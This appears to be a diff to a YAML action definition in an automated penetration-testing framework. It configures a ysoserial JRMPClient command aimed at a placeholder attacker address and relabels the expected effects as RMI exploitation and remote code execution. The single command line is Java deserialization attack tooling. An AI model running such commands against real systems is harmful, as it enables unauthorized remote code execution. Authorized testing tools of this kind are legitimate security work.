@@ -6,9 +6,10 @@ preconditions:
 parameters:
   target_ip: from_engagement.target_ip
 command_template: java -jar ysoserial-all.jar JRMPClient {attacker_ip}:9999 | xxd
-parser: null
+parser: generic_parser
 expected_effects:
-- action_completed
+- rmi_exploited
+- rce_achieved
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
